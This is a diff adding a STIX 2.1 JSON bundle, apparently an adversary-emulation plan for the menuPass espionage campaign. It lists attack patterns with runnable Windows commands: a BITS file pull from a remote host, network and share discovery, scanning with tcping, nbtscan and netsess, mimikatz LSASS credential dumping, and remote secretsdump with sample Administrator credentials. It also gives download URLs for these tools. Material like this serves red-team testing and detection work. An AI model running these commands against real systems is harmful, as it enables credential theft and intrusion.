@@ -1,0 +1,1499 @@
+{
+    "type": "bundle",
+    "id": "bundle--99111b34-8532-4cbe-8ee7-28d8f2a7725a",
+    "objects": [
+        {
+            "type": "campaign",
+            "spec_version": "2.1",
+            "id": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "created": "2024-02-04T20:40:57.752021Z",
+            "modified": "2024-02-04T20:40:57.752021Z",
+            "name": "menuPass",
+            "description": "menuPass is thought to be a Chinese cyber espionage group associated with activity directed by elements of the PRC MSS."
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--a750b196-8168-461a-8747-bdc4add107ac",
+            "created": "2024-02-04T20:40:57.752277Z",
+            "modified": "2024-02-04T20:40:57.752277Z",
+            "name": "Ingress Tool Transfer",
+            "description": "Pushing tools to compromised host",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1105",
+                    "input_arguments": {
+                        "bitsadmin_b64_encoded_string": {
+                            "default": "TWUEGJDITXAONVPUOWFV\n",
+                            "description": "Sample Base 64 Encoded String",
+                            "type": "String"
+                        },
+                        "bitsadmin_remote_ip": {
+                            "default": "remote-host\n",
+                            "description": "IP or hostname for remote connection",
+                            "type": "String"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "command": "Start-BitsTransfer -Source \"http://#{bitsadmin_remote_ip}/#{bitsadmin_b64_encoded_string}\" -Destination \"C:\\ProgramData\\temp\\#{bitsadmin_b64_encoded_string}\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--deeeff2c-23de-4795-904b-2c8dfd1d7ec6",
+            "created": "2024-02-04T20:40:57.753551Z",
+            "modified": "2024-02-04T20:40:57.753551Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--a750b196-8168-461a-8747-bdc4add107ac",
+            "target_ref": "ipv4-addr--bed2feb0-c282-5d01-9d1e-10ff289e1fe4"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--bed2feb0-c282-5d01-9d1e-10ff289e1fe4",
+            "value": "remote-host\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--56705466-630b-4c67-ac3e-5a37198ae5df",
+            "created": "2024-02-04T20:40:57.754062Z",
+            "modified": "2024-02-04T20:40:57.754062Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--a750b196-8168-461a-8747-bdc4add107ac",
+            "target_ref": "ipv4-addr--bed2feb0-c282-5d01-9d1e-10ff289e1fe4"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--bed2feb0-c282-5d01-9d1e-10ff289e1fe4",
+            "value": "remote-host\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--3c3d907e-3704-41e7-85ac-7259c2f2d91b",
+            "created": "2024-02-04T20:40:57.754331Z",
+            "modified": "2024-02-04T20:40:57.754331Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--a750b196-8168-461a-8747-bdc4add107ac"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--7877ec4d-3c11-40f2-9650-35261e4ac879",
+            "created": "2024-02-04T20:40:57.75452Z",
+            "modified": "2024-02-04T20:40:57.75452Z",
+            "name": "Network Share Discovery",
+            "description": "Display network shares",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1135",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net use\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Network Share Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--6a41ee7f-563f-4ff8-a9e2-4e2af2440895",
+            "created": "2024-02-04T20:40:57.754707Z",
+            "modified": "2024-02-04T20:40:57.754707Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--7877ec4d-3c11-40f2-9650-35261e4ac879"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--e132a235-fe43-45c2-a334-2f235a7646b5",
+            "created": "2024-02-04T20:40:57.754946Z",
+            "modified": "2024-02-04T20:40:57.754946Z",
+            "name": "Remote System Discovery",
+            "description": "Identify remote systems using net",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1018",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net view /domain\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Remote System Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d85c8d47-38ca-4aef-bf64-32d46afc3ed8",
+            "created": "2024-02-04T20:40:57.755118Z",
+            "modified": "2024-02-04T20:40:57.755118Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--e132a235-fe43-45c2-a334-2f235a7646b5"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--d19678ac-3bca-475e-89d4-f452bfc2cc2a",
+            "created": "2024-02-04T20:40:57.755294Z",
+            "modified": "2024-02-04T20:40:57.755294Z",
+            "name": "Remote System Discovery",
+            "description": "Identify remote system using Powershell",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1018",
+                    "input_arguments": {
+                        "host_address": {
+                            "default": "192.0.2.10\n",
+                            "description": "IP for host discovery",
+                            "type": "String"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "command": "Test-NetConnection \"#{host_address}\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Remote System Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--662e6bc9-6d69-440b-8101-b79fbe57ffca",
+            "created": "2024-02-04T20:40:57.756016Z",
+            "modified": "2024-02-04T20:40:57.756016Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--d19678ac-3bca-475e-89d4-f452bfc2cc2a",
+            "target_ref": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3",
+            "value": "192.0.2.10\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--7d98763b-3d6f-424b-9ec3-366bf104df42",
+            "created": "2024-02-04T20:40:57.756359Z",
+            "modified": "2024-02-04T20:40:57.756359Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--d19678ac-3bca-475e-89d4-f452bfc2cc2a"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--b6026408-c815-47ca-bbb0-6b74591badc8",
+            "created": "2024-02-04T20:40:57.75656Z",
+            "modified": "2024-02-04T20:40:57.75656Z",
+            "name": "Network Service Scanning",
+            "description": "Enumerate remote hosts for running services using tcping",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1046",
+                    "input_arguments": {
+                        "tcping_local_path": {
+                            "default": "C:\\Windows\\Temp\n",
+                            "description": "Path of tcping.exe",
+                            "type": "Path"
+                        },
+                        "tcping_remote_ip": {
+                            "default": "192.0.2.10\n",
+                            "description": "Hostname or IP to enumerate with tcping.exe",
+                            "type": "String"
+                        },
+                        "tcping_remote_port": {
+                            "default": "445\n",
+                            "description": "Port to enumerate with tcping.exe",
+                            "type": "String"
+                        },
+                        "tcping_url": {
+                            "default": "https://download.elifulkerson.com//files/tcping/0.39/tcping.exe",
+                            "description": "Path to download tcping.exe",
+                            "type": "URL"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "\"#{tcping_local_path}\\tcping.exe\" \"#{tcping_remote_ip}\" \"#{tcping_remote_port}\"\n",
+                                "payloads": [
+                                    "tcping.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Network Service Scanning"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5182da87-4118-4381-a5cf-82d90ed3f047",
+            "created": "2024-02-04T20:40:57.757246Z",
+            "modified": "2024-02-04T20:40:57.757246Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--b6026408-c815-47ca-bbb0-6b74591badc8",
+            "target_ref": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77"
+        },
+        {
+            "type": "directory",
+            "spec_version": "2.1",
+            "id": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77",
+            "path": "C:\\Windows\\Temp\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--bc5b48a5-b121-451a-bfbb-5b2f5b7e9026",
+            "created": "2024-02-04T20:40:57.757812Z",
+            "modified": "2024-02-04T20:40:57.757812Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--b6026408-c815-47ca-bbb0-6b74591badc8",
+            "target_ref": "url--5d42cf99-d587-58b4-9d50-7b41da147b58"
+        },
+        {
+            "type": "url",
+            "spec_version": "2.1",
+            "id": "url--5d42cf99-d587-58b4-9d50-7b41da147b58",
+            "value": "https://download.elifulkerson.com//files/tcping/0.39/tcping.exe"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a92e0e66-4023-46b0-a2bd-6a3d2d16f55e",
+            "created": "2024-02-04T20:40:57.758532Z",
+            "modified": "2024-02-04T20:40:57.758532Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--b6026408-c815-47ca-bbb0-6b74591badc8",
+            "target_ref": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3",
+            "value": "192.0.2.10\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--11cdb7b3-48dd-40e3-a7d7-aa77fa49d1d5",
+            "created": "2024-02-04T20:40:57.760411Z",
+            "modified": "2024-02-04T20:40:57.760411Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--b6026408-c815-47ca-bbb0-6b74591badc8",
+            "target_ref": "network-traffic--87e99a38-0d32-5832-aea3-59b681d3f0e7"
+        },
+        {
+            "type": "network-traffic",
+            "spec_version": "2.1",
+            "id": "network-traffic--87e99a38-0d32-5832-aea3-59b681d3f0e7",
+            "src_ref": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3",
+            "dst_port": 445,
+            "protocols": [
+                ""
+            ]
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e1af2c4d-9502-4953-a077-ae0a45a4f6d8",
+            "created": "2024-02-04T20:40:57.760849Z",
+            "modified": "2024-02-04T20:40:57.760849Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--b6026408-c815-47ca-bbb0-6b74591badc8"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--814005f7-c8d3-45c8-aea2-45758b2d6e90",
+            "created": "2024-02-04T20:40:57.761171Z",
+            "modified": "2024-02-04T20:40:57.761171Z",
+            "name": "System Network Configuration Discovery",
+            "description": "Scan for nameservers and enumerate NetBIOS sessions",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1016",
+                    "input_arguments": {
+                        "nbt_ip_range": {
+                            "default": "192.0.2.34/24\n",
+                            "description": "IP Range for nbtscan to enumerate",
+                            "type": "String"
+                        },
+                        "nbtscan_local_path": {
+                            "default": "C:\\Windows\\Temp\n",
+                            "description": "Path of nbtscan.exe",
+                            "type": "Path"
+                        },
+                        "nbtscan_url": {
+                            "default": "http://unixwiz.net/tools/nbtscan-1.0.35.exe\n",
+                            "description": "Path to download nbtscan.exe",
+                            "type": "URL"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "\"#{nbtscan_local_path}\\nbtscan.exe\" #{nbt_ip_range}\n",
+                                "payloads": [
+                                    "nbtscan.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "System Network Configuration Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--23157b23-3b73-4179-b1ad-3f4ddb1bfc5a",
+            "created": "2024-02-04T20:40:57.764812Z",
+            "modified": "2024-02-04T20:40:57.764812Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--814005f7-c8d3-45c8-aea2-45758b2d6e90",
+            "target_ref": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77"
+        },
+        {
+            "type": "directory",
+            "spec_version": "2.1",
+            "id": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77",
+            "path": "C:\\Windows\\Temp\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--c9303803-27f9-4ecc-bb24-da02c897cb8b",
+            "created": "2024-02-04T20:40:57.765553Z",
+            "modified": "2024-02-04T20:40:57.765553Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--814005f7-c8d3-45c8-aea2-45758b2d6e90",
+            "target_ref": "url--59101bad-cffe-5e8f-9971-eee1ffa265d8"
+        },
+        {
+            "type": "url",
+            "spec_version": "2.1",
+            "id": "url--59101bad-cffe-5e8f-9971-eee1ffa265d8",
+            "value": "http://unixwiz.net/tools/nbtscan-1.0.35.exe\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--0e72d536-85ef-4703-9e38-f8bf401a4034",
+            "created": "2024-02-04T20:40:57.766216Z",
+            "modified": "2024-02-04T20:40:57.766216Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--814005f7-c8d3-45c8-aea2-45758b2d6e90",
+            "target_ref": "ipv4-addr--450d1ce0-746f-550c-bca7-4a8bf9c42468"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--450d1ce0-746f-550c-bca7-4a8bf9c42468",
+            "value": "192.0.2.34/24\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8d6d3974-24d1-4b50-b19a-6054cd9db83f",
+            "created": "2024-02-04T20:40:57.766455Z",
+            "modified": "2024-02-04T20:40:57.766455Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--814005f7-c8d3-45c8-aea2-45758b2d6e90"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--9d543214-6476-429a-9ca1-cf12233b808c",
+            "created": "2024-02-04T20:40:57.767507Z",
+            "modified": "2024-02-04T20:40:57.767507Z",
+            "name": "System Network Configuration Discovery",
+            "description": "Scan for nameservers and enumerate NetBIOS sessions",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1016",
+                    "input_arguments": {
+                        "netsess_local_path": {
+                            "default": "C:\\Windows\\Temp\n",
+                            "description": "Path of netsess.exe",
+                            "type": "Path"
+                        },
+                        "netsess_remote_ip": {
+                            "default": "192.0.2.10\n",
+                            "description": "IP or hostname to run netsess.exe against",
+                            "type": "String"
+                        },
+                        "netsess_url": {
+                            "default": "http://www.joeware.net/downloads/files/NetSess.zip\n",
+                            "description": "Path to download netsess.exe",
+                            "type": "URL"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "\"#{netsess_local_path}\\netsess.exe\" #{netsess_remote_ip}\n",
+                                "payloads": [
+                                    "netsess.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "System Network Configuration Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--461fc49a-c77b-4d9f-b305-fdb7f6593a01",
+            "created": "2024-02-04T20:40:57.768398Z",
+            "modified": "2024-02-04T20:40:57.768398Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--9d543214-6476-429a-9ca1-cf12233b808c",
+            "target_ref": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77"
+        },
+        {
+            "type": "directory",
+            "spec_version": "2.1",
+            "id": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77",
+            "path": "C:\\Windows\\Temp\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--b4f0f2d3-a75c-42aa-af1f-77384fea30d1",
+            "created": "2024-02-04T20:40:57.768929Z",
+            "modified": "2024-02-04T20:40:57.768929Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--9d543214-6476-429a-9ca1-cf12233b808c",
+            "target_ref": "url--d62e4747-0a79-599a-bc98-9081bbc5a6b1"
+        },
+        {
+            "type": "url",
+            "spec_version": "2.1",
+            "id": "url--d62e4747-0a79-599a-bc98-9081bbc5a6b1",
+            "value": "http://www.joeware.net/downloads/files/NetSess.zip\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a5e8d1f1-a033-445a-9df9-48d48637b649",
+            "created": "2024-02-04T20:40:57.769484Z",
+            "modified": "2024-02-04T20:40:57.769484Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--9d543214-6476-429a-9ca1-cf12233b808c",
+            "target_ref": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--ac338119-a176-512b-81fa-6722586055d3",
+            "value": "192.0.2.10\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1e33efb1-c4ed-4a7f-a1ec-b9b3cf5c144b",
+            "created": "2024-02-04T20:40:57.769686Z",
+            "modified": "2024-02-04T20:40:57.769686Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--9d543214-6476-429a-9ca1-cf12233b808c"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--ffb50e17-cb3c-4424-a4e7-99e3885f22cc",
+            "created": "2024-02-04T20:40:57.76987Z",
+            "modified": "2024-02-04T20:40:57.76987Z",
+            "name": "OS Credential Dumping",
+            "description": "menuPass has used mimikatz.exe to dump credentials locally",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1003.001",
+                    "input_arguments": {
+                        "mimikatz_arch": {
+                            "default": "x64",
+                            "description": "Architecture folder (Win32 or x64)",
+                            "type": "String"
+                        },
+                        "mimikatz_local_path": {
+                            "default": "C:\\Windows\\Temp\n",
+                            "description": "Path of mimikatz",
+                            "type": "Path"
+                        },
+                        "mimikatz_module": {
+                            "default": "sekurlsa::logonpasswords\n",
+                            "description": "Mimikatz module",
+                            "type": "String"
+                        },
+                        "mimikatz_url": {
+                            "default": "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200917/mimikatz_trunk.zip",
+                            "description": "URL to download mimikatz.exe zip",
+                            "type": "URL"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "\"#{mimikatz_local_path}\\#{mimikatz_arch}\\mimikatz.exe\" \"#{mimikatz_module}\"\n",
+                                "payloads": [
+                                    "mimikatz.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "OS Credential Dumping: LSASS Memory"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--ca94d85a-36b4-4a2b-9bf6-2366b548b0ae",
+            "created": "2024-02-04T20:40:57.770443Z",
+            "modified": "2024-02-04T20:40:57.770443Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--ffb50e17-cb3c-4424-a4e7-99e3885f22cc",
+            "target_ref": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77"
+        },
+        {
+            "type": "directory",
+            "spec_version": "2.1",
+            "id": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77",
+            "path": "C:\\Windows\\Temp\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--bea685e4-ca7e-4321-b300-3328e0d08da5",
+            "created": "2024-02-04T20:40:57.770693Z",
+            "modified": "2024-02-04T20:40:57.770693Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--ffb50e17-cb3c-4424-a4e7-99e3885f22cc",
+            "target_ref": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77"
+        },
+        {
+            "type": "directory",
+            "spec_version": "2.1",
+            "id": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77",
+            "path": "C:\\Windows\\Temp\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5f2c4587-e0b8-42d1-9017-76dc18bd1f62",
+            "created": "2024-02-04T20:40:57.771084Z",
+            "modified": "2024-02-04T20:40:57.771084Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--ffb50e17-cb3c-4424-a4e7-99e3885f22cc",
+            "target_ref": "url--212d6210-2781-5f3e-af64-fe9827a70cfc"
+        },
+        {
+            "type": "url",
+            "spec_version": "2.1",
+            "id": "url--212d6210-2781-5f3e-af64-fe9827a70cfc",
+            "value": "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200917/mimikatz_trunk.zip"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--cd3117a6-dcfc-4390-9276-26f7ec1496d3",
+            "created": "2024-02-04T20:40:57.771381Z",
+            "modified": "2024-02-04T20:40:57.771381Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--ffb50e17-cb3c-4424-a4e7-99e3885f22cc",
+            "target_ref": "url--212d6210-2781-5f3e-af64-fe9827a70cfc"
+        },
+        {
+            "type": "url",
+            "spec_version": "2.1",
+            "id": "url--212d6210-2781-5f3e-af64-fe9827a70cfc",
+            "value": "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200917/mimikatz_trunk.zip"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--0b8faa6b-b78f-4103-b4de-be249ebaafe6",
+            "created": "2024-02-04T20:40:57.771586Z",
+            "modified": "2024-02-04T20:40:57.771586Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--ffb50e17-cb3c-4424-a4e7-99e3885f22cc"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--fe3d4de1-50bf-4241-9546-72dc757e696f",
+            "created": "2024-02-04T20:40:57.771767Z",
+            "modified": "2024-02-04T20:40:57.771767Z",
+            "name": "OS Credential Dumping",
+            "description": "menuPass has used secretsdump.exe to dump credentials remotely",
+            "extensions": {
+                "extension-definition--275ecdc9-ea11-4590-af51-804cef923432": {
+                    "attack_id": "T1003.002",
+                    "input_arguments": {
+                        "secretsdump_domain": {
+                            "default": "DOMAIN",
+                            "description": "Domain for secretsdump.exe command",
+                            "type": "String"
+                        },
+                        "secretsdump_local_path": {
+                            "default": "C:\\Windows\\Temp\n",
+                            "description": "Path of secretsdump.exe",
+                            "type": "Path"
+                        },
+                        "secretsdump_pass": {
+                            "default": "Password123",
+                            "description": "Password for secretsdump.exe command",
+                            "type": "String"
+                        },
+                        "secretsdump_remote_host": {
+                            "default": "192.0.2.10",
+                            "description": "Hostname or IP for secretsdump.exe connection",
+                            "type": "String"
+                        },
+                        "secretsdump_url": {
+                            "default": "https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/secretsdump_windows.exe",
+                            "description": "URL to download secretsdump.exe binary",
+                            "type": "URL"
+                        },
+                        "secretsdump_user": {
+                            "default": "Administrator",
+                            "description": "User for secretsdump.exe command",
+                            "type": "String"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "\"#{secretsdump_local_path}\\secretsdump.exe\" \"#{secretsdump_domain}\"/\"#{secretsdump_user}\":\"#{secretsdump_pass}\"@\"#{secretsdump_remote_host}\"\n",
+                                "payloads": [
+                                    "secretsdump.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "OS Credential Dumping: Security Account Manager"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--72451672-545c-4ac7-a6cb-b1c5fe50f08f",
+            "created": "2024-02-04T20:40:57.772565Z",
+            "modified": "2024-02-04T20:40:57.772565Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--fe3d4de1-50bf-4241-9546-72dc757e696f",
+            "target_ref": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77"
+        },
+        {
+            "type": "directory",
+            "spec_version": "2.1",
+            "id": "directory--13a63c15-6a3f-51c9-80be-2e126dbb3d77",
+            "path": "C:\\Windows\\Temp\n"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--09fe5138-82e3-43ff-ad6c-e8772d8c0cff",
+            "created": "2024-02-04T20:40:57.773258Z",
+            "modified": "2024-02-04T20:40:57.773258Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--fe3d4de1-50bf-4241-9546-72dc757e696f",
+            "target_ref": "url--5a632f96-74b8-5fe6-a20b-a9a29b981e9e"
+        },
+        {
+            "type": "url",
+            "spec_version": "2.1",
+            "id": "url--5a632f96-74b8-5fe6-a20b-a9a29b981e9e",
+            "value": "https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/secretsdump_windows.exe"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8849b1b4-d5b8-4fa1-a3aa-122aff26f75b",
+            "created": "2024-02-04T20:40:57.774387Z",
+            "modified": "2024-02-04T20:40:57.774387Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--fe3d4de1-50bf-4241-9546-72dc757e696f",
+            "target_ref": "domain-name--302847ad-c98b-5aa3-8b6e-353f5f94757d"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--302847ad-c98b-5aa3-8b6e-353f5f94757d",
+            "value": "DOMAIN"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--87a19e38-2ea1-42d9-b168-3e7a33751f3a",
+            "created": "2024-02-04T20:40:57.775518Z",
+            "modified": "2024-02-04T20:40:57.775518Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--fe3d4de1-50bf-4241-9546-72dc757e696f",
+            "target_ref": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f",
+            "account_login": "Administrator"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a4f8ce2c-f2fb-4b29-8b95-3575b510d16b",
+            "created": "2024-02-04T20:40:57.777083Z",
+            "modified": "2024-02-04T20:40:57.777083Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--fe3d4de1-50bf-4241-9546-72dc757e696f",
+            "target_ref": "user-account--a0585b0b-8dce-46e7-bf76-7145cd51d16b"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--a0585b0b-8dce-46e7-bf76-7145cd51d16b",
+            "credential": "Password123"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f02c14d1-a399-4a1e-a977-7650499d8974",
+            "created": "2024-02-04T20:40:57.777854Z",
+            "modified": "2024-02-04T20:40:57.777854Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--fe3d4de1-50bf-4241-9546-72dc757e696f",
+            "target_ref": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2",
+            "value": "192.0.2.10"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--c9e0f8a1-34ee-4623-b673-4c5c32117eb4",
+            "created": "2024-02-04T20:40:57.778156Z",
+            "modified": "2024-02-04T20:40:57.778156Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--b5192070-dff1-4134-bf66-c6b87c7498af",
+            "target_ref": "attack-pattern--fe3d4de1-50bf-4241-9546-72dc757e696f"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--4b1748e5-532c-453c-b195-557ce5550fef",
+            "created": "2024-02-04T20:40:57.778524Z",
+            "modified": "2024-02-04T20:40:57.778524Z",
+            "name": "Service Execution",
